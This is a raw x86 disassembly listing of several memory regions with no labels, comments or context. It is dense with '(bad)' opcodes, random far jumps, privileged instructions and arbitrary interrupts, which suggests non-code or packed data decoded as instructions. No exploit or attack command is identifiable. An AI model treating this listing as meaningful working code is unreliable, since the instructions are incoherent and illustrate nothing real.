  427f39:	jmp    0xda1f:0xbeabce2d
  427f40:	stos   DWORD PTR es:[edi],eax
  427f41:	mov    edx,DWORD PTR [ecx]
  427f43:	mov    ecx,0xa985f3aa
  427f48:	lds    esp,FWORD PTR [ebx]
  427f4a:	stc    
  427f4b:	xor    al,0xad
  427f4d:	cdq    
  427f4e:	imul   ecx,edi,0xffffffaf
  427f51:	xchg   esp,eax
  427f52:	jle    0x427fbc
  427f54:	mov    bl,0x41
  427f56:	cli    
  427f57:	mov    esi,0xacf5012
  427f5c:	int    0x84
  427f5e:	lods   al,BYTE PTR ds:[esi]
  427f5f:	mov    al,0x2b
  427f61:	ret    0x3c1b
  427f64:	int    0xf5
  427f66:	aam    0x3c
  427f68:	stos   BYTE PTR es:[edi],al
  427f69:	inc    esi
  427f6a:	pop    ebx
  427f6b:	daa    
  427f6c:	jae    0x427f06
  427f6e:	push   ebp
  427f6f:	xchg   ebp,eax
  427f70:	ret    
  427f71:	dec    esi
  427f72:	es xor al,0xd4
  427f75:	lods   al,BYTE PTR ds:[esi]
  427f76:	(bad)  
  427f77:	mov    ebp,0xc2bd472f
  427f7c:	add    BYTE PTR [esi+0x44d02cf0],dl
  427f82:	inc    edx
  427f83:	sub    BYTE PTR [edx],ah
  427f85:	inc    esi
  427f86:	imul   ecx,DWORD PTR [edx+0x6cef4095],0x7e1f0ede
  427f90:	into   
  427f91:	mov    eax,ds:0x38c86633
  427f96:	mov    al,ds:0x47773146
  427f9b:	jb     0x428004
  427f9d:	mov    ebp,fs
  427f9f:	xchg   edx,eax
  427fa0:	shl    BYTE PTR [edx+0x44],cl
  427fa3:	sub    DWORD PTR [esi-0x5d5004b2],ecx
  427fa9:	dec    esi
  427faa:	cli    
  427fab:	dec    DWORD PTR [esi+0x82dd0b2]
  427fb1:	outs   dx,BYTE PTR ds:[esi]
  427fb2:	fdiv   DWORD PTR ss:[ecx]
  427fb5:	pop    edi
  427fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fb7:	fcomp  DWORD PTR [ebx-0x7a]
  427fba:	push   cs
  427fbb:	xor    DWORD PTR [ecx],ebp
  427fbd:	push   esi
  427fbe:	jno    0x427ff2
  427fc0:	test   BYTE PTR ds:0x0,ah
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [edi-0x6b8c61e8],ebp
  428045:	test   eax,0xf60001
  42804a:	add    BYTE PTR [eax],al
  42804c:	fdivr  QWORD PTR [esp+eax*1+0x3e]
  428050:	jnp    0x428002
  428052:	pop    es
  428053:	jg     0x428081
  428055:	push   edi
  428056:	aaa    
  428057:	xchg   edi,eax
  428058:	jb     0x42806a
  42805a:	retf   
  42805b:	lods   al,BYTE PTR ds:[esi]
  42805c:	cmp    eax,0x7ce36ed0
  428061:	adc    edx,esi
  428063:	mov    bl,0x2
  428065:	dec    eax
  428066:	dec    esp
  428067:	dec    ebp
  428068:	push   cs
  428069:	retf   0xc0b
  42806c:	sar    BYTE PTR [edx-0x3cc5608a],0x76
  428073:	je     0x4280c9
  428075:	iret   
  428076:	jmp    0xc2c5:0x564bb0
  42807d:	xor    ah,bl
  42807f:	sti    
  428080:	jmp    0x4280f9
  428082:	adc    al,0xbb
  428084:	(bad)  
  428085:	push   cs
  428086:	loopne 0x4280cf
  428088:	dec    edx
  428089:	push   es
  42808a:	mov    ?,WORD PTR [ebx]
  42808c:	mov    ebp,0xaa973117
  428091:	mov    edx,0x29e10a89
  428096:	mov    ebp,0x71cd6aab
  42809b:	in     eax,dx
  42809c:	dec    edx
  42809d:	jmp    DWORD PTR [ebx+0x4]
  4280a0:	scas   eax,DWORD PTR es:[edi]
  4280a1:	imul   bh
  4280a3:	rcr    BYTE PTR [esi+eax*4],cl
  4280a6:	stos   DWORD PTR es:[edi],eax
  4280a7:	mov    WORD PTR [ebx-0x7a],?
  4280aa:	sub    ecx,edi
  4280ac:	push   ds
  4280ad:	neg    BYTE PTR [ebx]
  4280af:	int3   
  4280b0:	lahf   
  4280b1:	dec    ecx
  4280b2:	sbb    BYTE PTR [edi],al
  4280b4:	pop    esi
  4280b5:	ret    
  4280b6:	adc    dl,BYTE PTR [edx+0x26]
  4280b9:	scas   eax,DWORD PTR es:[edi]
  4280ba:	cmp    DWORD PTR [eax],edi
  4280bc:	gs into 
  4280be:	mov    eax,ds:0xaf6071ff
  4280c3:	xchg   esp,eax
  4280c4:	sbb    eax,0x347e371a
  4280c9:	push   edi
  4280ca:	cmp    esi,ecx
  4280cc:	fmul   QWORD PTR [esi]
  4280ce:	jge    0x428082
  4280d0:	xchg   ebx,eax
  4280d1:	push   ebp
  4280d2:	inc    edx
  4280d3:	jg     0x428063
  4280d5:	shr    ch,0xd5
  4280d8:	repz fnstcw WORD PTR ds:0x294a2e5a
  4280df:	aas    
  4280e0:	les    esp,FWORD PTR [eax-0x4e]
  4280e3:	es nop
  4280e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e6:	scas   eax,DWORD PTR es:[edi]
  4280e7:	cld    
  4280e8:	dec    edx
  4280e9:	sbb    DWORD PTR [ebx],eax
  4280eb:	das    
  4280ec:	retf   
  4280ed:	and    al,0xca
  4280ef:	pushf  
  4280f0:	outs   dx,BYTE PTR ds:[esi]
  4280f1:	inc    edx
  4280f2:	and    BYTE PTR [eax+0x62078e95],ch
  4280f8:	aaa    
  4280f9:	ret    0xcab
  4280fc:	push   edx
  4280fd:	cmp    esp,0x8ae8ca28
  428103:	dec    ecx
  428104:	sub    al,0x3b
  428106:	mov    ch,0xfb
  428108:	sbb    BYTE PTR [esi-0x41],bl
  42810b:	jmp    0x9ea13e4a
  428110:	pop    eax
  428111:	scas   eax,DWORD PTR es:[edi]
  428112:	sti    
  428113:	mov    cl,0xe7
  428115:	mov    ecx,0x32c41d90
  42811a:	daa    
  42811b:	jno    0x428176
  42811d:	int    0x21
  42811f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428120:	inc    edx
  428121:	mov    DWORD PTR ds:0xf00f52a6,ebx
  428127:	ror    BYTE PTR [ebp-0x3b82f2c9],0x1f
  42812e:	call   DWORD PTR [ecx]
  428130:	inc    edi
  428131:	leave  
  428132:	adc    ah,BYTE PTR [ecx]
  428134:	pop    ss
  428135:	push   eax
  428136:	inc    ecx
  428137:	cld    
  428138:	test   DWORD PTR ds:0x861744c2,ebx
  42813e:	and    al,0x59
  428141:	ja     0x428143
	...
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x233ae04f
  4281c3:	sbb    ecx,DWORD PTR [edx-0x9fffe56]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [eax],bl
  4281cd:	sub    ah,BYTE PTR [edx+0x170c3517]
  4281d3:	mov    gs,WORD PTR [ebx+0x68]
  4281d6:	pop    esp
  4281d7:	lea    edi,[edi]
  4281d9:	(bad)  
  4281da:	out    0xd0,eax
  4281dc:	adc    ebp,DWORD PTR [ebx+0x1395cdfc]
  4281e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281e3:	mov    cl,0xa9
  4281e5:	adc    edi,DWORD PTR [esi-0x1c]
  4281e8:	std    
  4281e9:	pusha  
  4281ea:	lods   al,BYTE PTR ds:[esi]
  4281eb:	(bad)  
  4281ec:	cmp    al,0x9c
  4281ee:	fnstsw WORD PTR [esi-0xb]
  4281f1:	pop    eax
  4281f2:	mov    bh,0x5b
  4281f4:	and    DWORD PTR [edi+0x55],ebp
  4281f7:	loop   0x4281ec
  4281f9:	into   
  4281fa:	xchg   ebp,eax
  4281fb:	mov    eax,0x9016dae9
  428200:	pop    bx
  428202:	call   FWORD PTR [edx]
  428204:	daa    
  428205:	lock mov eax,0xaa14e103
  42820b:	in     al,0x40
  42820d:	push   cs
  42820e:	lods   eax,DWORD PTR ds:[si]
  428210:	rcr    BYTE PTR [ebx+0x6a],1
  428213:	add    ah,BYTE PTR [ebx-0x5]
  428216:	add    BYTE PTR [edi-0x3a],0x48
  42821a:	push   esp
  42821b:	or     dh,dl
  42821d:	xchg   ebp,eax
  42821e:	loopne 0x428204
  428220:	retf   0xc21f
  428223:	fadd   st(6),st
  428225:	push   ebp
  428226:	lahf   
  428227:	and    DWORD PTR [esi-0x4d8f115e],esp
  42822d:	add    ecx,DWORD PTR [edi+0x2f82c69d]
  428233:	bound  ebp,QWORD PTR [edi+0x22b198e9]
  428239:	xor    BYTE PTR [edi+0x1bb40df8],0x87
  428240:	add    BYTE PTR [eax+0xbbd8738],0x96
  428247:	pop    edi
  428248:	xor    BYTE PTR [edi],0x31
  42824b:	nop
  42824c:	mov    DWORD PTR [edx+0x32cc4048],edx
  428252:	call   0x26e1:0x208e6f26
  428259:	int    0xf2
  42825b:	stos   BYTE PTR es:[edi],al
  42825c:	push   ecx
  42825d:	pop    DWORD PTR [ecx+0x1a]
  428260:	sbb    eax,0x370c0c6
  428265:	fisub  DWORD PTR [eax-0x3a1663f1]
  42826b:	mov    WORD PTR [esi+ebx*8-0x7c],ss
  42826f:	loope  0x428242
  428271:	inc    ebx
  428272:	jp     0x4282d1
  428274:	rdmsr  
  428276:	xchg   edi,eax
  428277:	sbb    BYTE PTR [edi],ah
  428279:	adc    BYTE PTR [esi+ebx*8-0xd80ba0e],bl
  428280:	xchg   DWORD PTR [edx+0x563a351d],edx
  428286:	fwait
  428287:	daa    
  428288:	and    DWORD PTR [eax+ecx*4+0x54d697c7],ecx
  42828f:	xchg   ecx,eax
  428290:	and    BYTE PTR [ecx+0xf],ah
  428293:	xchg   BYTE PTR [esi+0x4c],al
  428296:	aad    0x1b
  428298:	loope  0x42830c
  42829a:	mov    BYTE PTR [ebx],cl
  42829c:	call   0x63a9:0x256d1334
  4282a3:	loop   0x42825a
  4282a5:	mov    cl,0x14
  4282a7:	and    eax,0x301f5460
  4282ac:	psubsb mm2,QWORD PTR [ebp+0x5b]
  4282b0:	outs   dx,BYTE PTR ds:[esi]
  4282b1:	dec    edx
  4282b2:	dec    ebp
  4282b3:	or     DWORD PTR [eax-0x7a9ef411],esp
  4282b9:	ficom  DWORD PTR [ecx-0x6d]
  4282bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282bd:	enter  0xc29,0x5a
  4282c1:	lds    eax,FWORD PTR [eax]
	...
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	fucomp st(3)
  428342:	cs stc 
  428344:	sub    BYTE PTR [ebx+0xf60001],0x0
  42834b:	add    dh,al
  42834d:	mov    bh,0xc3
  42834f:	out    0x39,eax
  428351:	add    dl,BYTE PTR [ebx+0x66d3ed41]
  428357:	sub    bl,bl
  428359:	fwait
  42835a:	dec    edi
  42835b:	mov    esp,DWORD PTR [ecx]
  42835d:	dec    ebp
  42835e:	push   edi
  42835f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428360:	adc    al,0xb4
  428362:	mov    al,ds:0x92e4fb10
  428367:	loop   0x428363
  428369:	mov    bh,0xeb
  42836b:	inc    esp
  42836c:	rcl    ebp,cl
  42836e:	sbb    BYTE PTR [eax+0x7],bl
  428371:	xor    ebx,0x18d88f0
  428377:	fisttp DWORD PTR [edi-0x70942f06]
  42837d:	add    dh,dl
  42837f:	adc    BYTE PTR [ecx-0x7b],bl
  428382:	add    ebx,DWORD PTR [ecx-0x1b03a683]
  428388:	es mov esi,0x886ba98c
  42838e:	inc    BYTE PTR [edi-0x1058e3a0]
  428394:	in     al,dx
  428395:	imul   DWORD PTR [ecx+edx*2+0x301f3e96]
  42839c:	sub    ch,BYTE PTR [ecx]
  42839e:	and    eax,0x85549307
  4283a3:	push   ecx
  4283a4:	and    ebp,ebx
  4283a6:	js     0x4283f8
  4283a8:	fs xchg ebp,eax
  4283aa:	in     eax,0x6f
  4283ac:	neg    DWORD PTR [edi+0x4c]
  4283af:	call   0x18bed2f3
  4283b4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4283b6:	jecxz  0x42839f
  4283b8:	fsubp  st(3),st
  4283ba:	dec    esi
  4283bb:	pop    ebp
  4283bc:	jle    0x4283f9
  4283be:	jecxz  0x4283ec
  4283c0:	add    bh,BYTE PTR [edx+0x1b3f99ad]
  4283c6:	jecxz  0x42838d
  4283c8:	sub    eax,0x4e18e61e
  4283cd:	pop    ebp
  4283ce:	loop   0x42841b
  4283d0:	lods   eax,DWORD PTR ds:[esi]
  4283d1:	dec    BYTE PTR [eax]
  4283d3:	loopne 0x42838c
  4283d5:	lsl    edi,WORD PTR [esi+eiz*1-0x70dedb5a]
  4283dd:	cmp    BYTE PTR [ebp+0x1cff87cb],ah
  4283e3:	add    BYTE PTR [esi-0x5f9c424e],cl
  4283e9:	xchg   edx,eax
  4283ea:	js     0x4283d2
  4283ec:	pop    esi
  4283ed:	imul   esi,DWORD PTR [ebp-0x404b0f2f],0xe8a1c456
  4283f7:	fstp   DWORD PTR [esi]
  4283f9:	sbb    DWORD PTR [ecx+0x9],ebx
  4283fc:	mov    bl,0x48
  4283fe:	int    0x50
  428400:	scas   al,BYTE PTR es:[edi]
  428401:	push   ss
  428402:	adc    ch,BYTE PTR [ebx-0x254fc4d7]
  428408:	cdq    
  428409:	inc    ebx
  42840a:	xor    DWORD PTR [ecx+edx*1+0x7b556470],esp
  428411:	(bad)  
  428412:	mov    al,0xe1
  428414:	sahf   
  428415:	loopne 0x42844f
  428417:	add    al,0x94
  428419:	shr    BYTE PTR [edx+0x52],cl
  42841c:	mov    eax,ds:0x54618c01
  428421:	xlat   BYTE PTR ds:[ebx]
  428422:	test   DWORD PTR [ecx+0x10287545],edi
  428428:	loop   0x42849d
  42842a:	pop    edi
  42842b:	inc    ebp
  42842c:	cmp    dl,0xd7
  42842f:	sub    ch,dh
  428431:	hlt    
  428432:	add    DWORD PTR [esi-0x1],ebp
  428435:	or     al,dl
  428437:	fst    QWORD PTR [eax]
  428439:	cmp    al,0xe0
  42843b:	push   ebx
  42843c:	mov    DWORD PTR [ecx+0x4d],ebx
  42843f:	adc    ebp,DWORD PTR [esi+0xec]
	...
  4284b1:	add    BYTE PTR [eax],al
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0x186b3407]
  4284c1:	push   0xac765d34
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	test   BYTE PTR [eax],0x0
  4284cb:	add    BYTE PTR [esi+0x2bcaefc1],al
  4284d1:	cmc    
  4284d2:	std    
  4284d3:	add    ebx,esp
  4284d5:	cli    
  4284d6:	adc    al,0xc8
  4284d8:	ins    DWORD PTR es:[edi],dx
  4284d9:	stos   BYTE PTR es:[edi],al
  4284da:	sbb    bl,BYTE PTR [edx+0x2f]
  4284dd:	jmp    0x428510
  4284df:	xor    DWORD PTR [ecx-0xe398a2],ebx
  4284e5:	mov    ds:0xca45b189,al
  4284ea:	xlat   BYTE PTR ds:[ebx]
  4284eb:	rol    DWORD PTR [edi-0x40],1
  4284ee:	pusha  
  4284ef:	test   BYTE PTR [eax-0x50],ch
  4284f2:	jl     0x428553
  4284f4:	fs loope 0x4284b4
  4284f7:	hlt    
  4284f8:	(bad)  
  4284fa:	js     0x4284c6
  4284fc:	enter  0xb0e,0x41
  428500:	cs adc al,0x25
  428503:	popf   
  428504:	xor    eax,eax
  428506:	enter  0x984a,0x3a
  42850a:	push   esi
  42850b:	imul   eax,DWORD PTR [ecx],0x48f09259
  428511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428512:	push   ebp
  428513:	cmp    al,0x46
  428515:	imul   esi,DWORD PTR [edi+0x7a4a1418],0x38
  42851c:	ja     0x428517
  42851e:	sbb    eax,0xf7dd1d38
  428523:	aas    
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	test   DWORD PTR [edx],0xb4876db5
  42852b:	in     al,dx
  42852c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852d:	push   ds
  42852e:	jp     0x428598
  428530:	xlat   BYTE PTR ds:[ebx]
  428531:	mov    edi,0xf215212d
  428536:	cmp    ah,BYTE PTR [ebx+0x1416bbe1]
  42853c:	xchg   eax,esp
  42853e:	adc    DWORD PTR [ecx+0x3a],edx
  428541:	pop    ebx
  428542:	jno    0x42854c
  428544:	pop    esi
  428545:	sub    esi,edi
  428547:	aaa    
  428548:	test   BYTE PTR [esi-0x5e],ch
  42854b:	push   ss
  42854c:	pop    edx
  42854d:	mov    WORD PTR [esi-0x5b1589b4],es
  428553:	inc    edi
  428554:	test   eax,0xb2bc70ca
  428559:	in     al,0x7
  42855b:	loope  0x42850f
  42855d:	jmp    0xe04eac7b
  428562:	call   0xb33aab5d
  428567:	push   es
  428568:	into   
  428569:	ja     0x428532
  42856b:	ret    0x55ab
  42856e:	popf   
  42856f:	sub    dl,BYTE PTR [ebx-0x40c2c438]
  428575:	ds inc esi
  428577:	add    esi,DWORD PTR [edx]
  428579:	mov    dh,0x8f
  42857b:	push   ebx
  42857c:	dec    BYTE PTR [ebx+edi*4-0x32]
  428580:	sub    DWORD PTR [esi-0x3dc498d2],esi
  428586:	sub    BYTE PTR [esi-0x20595988],bh
  42858c:	mov    eax,ds:0x1938754c
  428591:	cmp    al,0x6b
  428593:	mov    BYTE PTR [esi],0xf3
  428596:	cmp    esp,edi
  428598:	inc    eax
  428599:	and    BYTE PTR [ecx],0xe7
  42859c:	cs mov bh,0x82
  42859f:	lock stos DWORD PTR es:[edi],eax
  4285a1:	bound  ecx,QWORD PTR [ebx]
  4285a3:	mov    ebx,esp
  4285a5:	cmp    al,0xb6
  4285a7:	lahf   
  4285a8:	arpl   WORD PTR [ebx-0x39052df8],bx
  4285ae:	pop    ss
  4285af:	sub    BYTE PTR [edx],dl
  4285b1:	stos   DWORD PTR es:[edi],eax
  4285b2:	outs   dx,DWORD PTR ds:[esi]
  4285b3:	int    0x5b
  4285b5:	mov    bh,0x7d
  4285b7:	adc    DWORD PTR [edx-0x293bc72a],ebx
  4285bd:	dec    ebp
  4285be:	sub    BYTE PTR [esi],ch
  4285c0:	ss sbb eax,0x0
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	push   ecx
  428641:	push   ds
  428642:	lahf   
  428643:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x1]
  428647:	add    dh,dh
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR [esi+0x3c],ch
  42864e:	out    dx,eax
  42864f:	adc    DWORD PTR [esi-0x5c6d39e3],esi
  428655:	jle    0x42860c
  428657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428658:	popa   
  428659:	test   BYTE PTR [ebp-0x2],cl
  42865c:	ret    
  42865d:	data16 mov dl,0x65
  428660:	ds fs cwde 
  428663:	xor    ecx,DWORD PTR ss:[edi+edi*2]
  428667:	sub    DWORD PTR [edx+0x3f5c6227],ebx
  42866d:	pop    edi
  42866e:	ror    esi,cl
  428670:	fbld   TBYTE PTR [esi-0x6d]
  428673:	sbb    bl,BYTE PTR es:[ebx+0x14]
  428677:	push   edi
  428678:	or     esi,edi
  42867a:	fcom   DWORD PTR [ebp+0x4b48201f]
  428680:	or     esp,DWORD PTR [edi-0x757f794a]
  428686:	in     al,dx
  428687:	dec    eax
  428688:	stos   BYTE PTR es:[edi],al
  428689:	push   esp
  42868a:	aam    0xe4
  42868c:	dec    ecx
  42868d:	and    edx,esi
  42868f:	pop    es
  428690:	leave  
  428691:	adc    DWORD PTR [esi],ecx
  428693:	and    ecx,DWORD PTR [ecx-0x49]
  428696:	fstp   TBYTE PTR [edi+0x2e80b288]
  42869c:	cdq    
  42869d:	icebp  
  42869e:	sbb    DWORD PTR [edi+0x2],0xb19ec887
  4286a5:	imul   DWORD PTR [edi-0x79]
  4286a8:	call   0xbd61e23c
  4286ad:	jno    0x4286b9
  4286af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286b0:	loope  0x42867d
  4286b2:	pusha  
  4286b3:	pop    edi
  4286b4:	jae    0x4286ce
  4286b6:	fild   DWORD PTR [ebx]
  4286b8:	push   cs
  4286b9:	cmp    ch,BYTE PTR [eax+0x1fd5aed6]
  4286bf:	dec    ecx
  4286c0:	(bad)  
  4286c2:	xor    ah,BYTE PTR [ebp+eax*4-0x27]
  4286c6:	xchg   edi,eax
  4286c7:	xor    al,cl
  4286c9:	or     eax,0x8854aba1
  4286ce:	daa    
  4286cf:	js     0x42872f
  4286d1:	and    BYTE PTR [esi+0x1703fb99],ah
  4286d7:	bound  edi,QWORD PTR [eax+0x215b9f14]
  4286dd:	xor    dh,BYTE PTR [ebx+edx*1-0x5427ad63]
  4286e4:	shl    DWORD PTR [ebx+0x52],1
  4286e7:	call   0xf633:0x1470964d
  4286ee:	js     0x428718
  4286f0:	inc    esp
  4286f1:	pop    es
  4286f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286f3:	int3   
  4286f4:	(bad)  
  4286f5:	leave  
  4286f6:	mov    ebp,0xeef3ac86
  4286fb:	scas   al,BYTE PTR es:[edi]
  4286fc:	fwait
  4286fd:	jmp    0xa7c00f05
  428702:	inc    ebp
  428703:	fwait
  428704:	ins    BYTE PTR es:[edi],dx
  428705:	mov    WORD PTR [edi+0x7c9d8388],ss
  42870b:	rcr    DWORD PTR [eax],1
  42870d:	das    
  42870e:	dec    esp
  42870f:	mov    bh,0x9c
  428711:	inc    esp
  428712:	mov    DWORD PTR [eax-0x3d],ebx
  428715:	jbe    0x4286a3
  428717:	push   ebp
  428718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428719:	lahf   
  42871a:	xchg   edi,eax
  42871b:	and    edi,DWORD PTR [ecx]
  42871d:	out    0x6f,al
  42871f:	div    BYTE PTR [edi-0xa]
  428722:	daa    
  428723:	(bad)  
  428724:	jle    0x4286ea
  428726:	pop    eax
  428727:	add    eax,0xe95663a2
  42872c:	addr16 jge 0x428716
  42872f:	ins    DWORD PTR es:[edi],dx
  428730:	inc    esi
  428731:	std    
  428732:	jns    0x4286bd
  428734:	jl     0x42872c
  428736:	ret    0x1df3
  428739:	cmp    al,BYTE PTR [eax]
  42873b:	fisttp QWORD PTR [ebx+0x7b24ca82]
  428741:	push   0x0
	...
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0x5bdc299e
  4287c2:	not    BYTE PTR [edx+eiz*2-0x9fffe52]
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [ecx],ah
  4287cd:	mov    cl,BYTE PTR [edx]
  4287cf:	fmul   QWORD PTR ds:0xbceb6b64
  4287d5:	test   edi,esp
  4287d7:	jecxz  0x4287ae
  4287d9:	adc    eax,0x5df1e0f8
  4287de:	adc    al,0x32
  4287e0:	das    
  4287e1:	jne    0x428785
  4287e3:	xchg   esp,eax
  4287e4:	imul   ebp,eax,0x42051da6
  4287ea:	lahf   
  4287eb:	jmp    0x8e58:0xb6ecb91b
  4287f2:	stc    
  4287f3:	lods   al,BYTE PTR ds:[esi]
  4287f4:	(bad)  
  4287f5:	scas   eax,DWORD PTR es:[edi]
  4287f6:	test   BYTE PTR [esi],ah
  4287f8:	cdq    
  4287f9:	and    DWORD PTR [ebp-0x2b],eax
  4287fc:	dec    ebx
  4287fd:	(bad)  
  4287ff:	imul   edx,DWORD PTR [eax+0x69],0x43
  428803:	jp     0x4287a2
  428805:	jp     0x428834
  428807:	leave  
  428808:	and    al,0xf0
  42880a:	adc    eax,0x42318626
  42880f:	out    dx,al
  428810:	mov    edi,0xd4914005
  428815:	lods   eax,DWORD PTR ds:[esi]
  428816:	mov    BYTE PTR [ecx+0x79ce5c21],al
  42881c:	push   ebp
  42881d:	(bad)  
  42881e:	xchg   esi,eax
  42881f:	jp     0x4287dd
  428821:	cld    
  428822:	adc    BYTE PTR [esi-0x27],0xdb
  428826:	sbb    ch,BYTE PTR [edi]
  428828:	push   0x949c0550
  42882d:	cdq    
  42882e:	xchg   ecx,eax
  42882f:	addr16 stc 
  428831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428832:	sti    
  428833:	dec    eax
  428834:	and    esp,ecx
  428836:	jp     0x428812
  428838:	xchg   esi,esi
  42883a:	(bad)
  42883f:	ins    DWORD PTR es:[edi],dx
  428840:	pusha  
  428841:	das    
  428842:	inc    eax
  428843:	popa   
  428844:	jg     0x42882b
  428846:	sar    DWORD PTR [edx+0x8d44dd7],cl
  42884c:	xlat   BYTE PTR ds:[ebx]
  42884d:	jo     0x428831
  42884f:	enterw 0x77f9,0xde
  428854:	cli    
  428855:	dec    edi
  428856:	jae    0x42887b
  428858:	pushf  
  428859:	icebp  
  42885a:	or     ecx,ebx
  42885c:	push   di
  42885e:	jo     0x4288b3
  428860:	(bad)  
  428861:	xchg   edi,eax
  428862:	retf   0xa863
  428865:	(bad)
  428869:	jl     0x4288b7
  42886b:	inc    edi
  42886c:	push   ds
  42886d:	mov    bl,0xa
  42886f:	scas   eax,DWORD PTR es:[edi]
  428870:	pop    ds
  428871:	push   edx
  428872:	and    BYTE PTR [esi+0x784f7394],0xd0
  428879:	and    dh,BYTE PTR [ecx+ebp*4+0x595bc717]
  428880:	ins    DWORD PTR es:[edi],dx
  428881:	es fwait
  428883:	daa    
  428884:	jmp    0x98ad:0x1aef0fe9
  42888b:	xor    al,0xd8
  42888d:	jne    0x4288fa
  42888f:	dec    esi
  428890:	int    0x4f
  428892:	cs jmp 0xb347c965
  428898:	adc    edx,DWORD PTR [eax]
  42889a:	or     ebx,DWORD PTR [ebx-0x78adac25]
  4288a0:	in     eax,0xe1
  4288a2:	cdq    
  4288a3:	mov    eax,ds:0x5f2e238e
  4288a8:	sbb    al,0x54
  4288aa:	fst    QWORD PTR [esi+eiz*2]
  4288ad:	out    0x40,al
  4288af:	xor    al,0x63
  4288b1:	hlt    
  4288b2:	sub    DWORD PTR [edx],ecx
  4288b4:	rcl    DWORD PTR [eiz*2-0x6f7d4dbc],0x2d
  4288bc:	sbb    DWORD PTR [ecx-0x36198cc8],0x0
	...
  428932:	add    BYTE PTR [eax],al
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
  42893d:	jns    0x4289b6
  42893f:	jmp    0xaf58:0xc23826c7
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    BYTE PTR [eax-0x136f9d81],dl
  428951:	adc    dh,BYTE PTR [edi-0x32da5147]
  428957:	pop    esp
  428958:	cmp    al,0xef
  42895a:	in     eax,dx
  42895b:	jg     0x428944
  42895d:	mov    ebp,0xb6e4e5f3
  428962:	fs (bad) 
  428964:	int    0x94
  428966:	in     al,dx
  428967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428968:	push   esi
  428969:	or     ebp,DWORD PTR [eax]
  42896b:	data16 loope 0x42895c
  42896e:	arpl   WORD PTR [esi+0x55],sp
  428971:	xchg   DWORD PTR cs:[ebp-0x4e8f24cb],edx
  428978:	sub    BYTE PTR [ebx],dl
  42897a:	(bad)  
  42897b:	jp     0x428942
  42897d:	sbb    DWORD PTR ds:0xfc8b7ea9,ecx
  428983:	pusha  
  428984:	iret   
  428985:	jne    0x42891f
  428987:	cmp    dh,dh
  428989:	cdq    
  42898a:	push   ecx
  42898b:	imul   eax,DWORD PTR [ebp-0x29e29250],0xab16ed68
  428995:	enter  0x21b4,0x10
  428999:	xor    DWORD PTR [ebp-0x56],ecx
  42899c:	push   ebp
  42899d:	and    ecx,DWORD PTR [ebx+0x79]
  4289a0:	add    al,0x84
  4289a2:	pop    eax
  4289a3:	js     0x4289c5
  4289a5:	jae    0x42896d
  4289a7:	or     DWORD PTR [ebp+0x3025d236],edi
  4289ad:	sti    
  4289ae:	jbe    0x428930
  4289b0:	shl    DWORD PTR [edx-0xf785a52],1
  4289b6:	cmp    BYTE PTR [ecx-0xa2b2f21],ah
  4289bc:	mov    al,ds:0x5be6826e
  4289c1:	int    0x65
  4289c3:	or     ah,dh
  4289c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289c6:	push   cs
  4289c7:	aad    0x39
  4289c9:	xchg   DWORD PTR [eax+0x3a],edx
  4289cc:	xchg   edi,eax
  4289cd:	push   edx
  4289ce:	(bad)  
  4289cf:	fld    TBYTE PTR [edx]
  4289d1:	adc    ebp,esp
  4289d3:	and    eax,0x7481709e
  4289d8:	cmp    ecx,DWORD PTR [edx+0x2e24a825]
  4289de:	mov    al,ds:0x6d26a6a9
  4289e3:	dec    esp
  4289e4:	(bad)  
  4289e5:	scas   eax,DWORD PTR es:[edi]
  4289e6:	fdivr  QWORD PTR [edx]
  4289e8:	sbb    BYTE PTR [esi],0xf2
  4289eb:	(bad)  
  4289ec:	push   0xffffffaa
  4289ee:	cmp    al,0xed
  4289f0:	mov    WORD PTR ds:0x79ec647d,ds
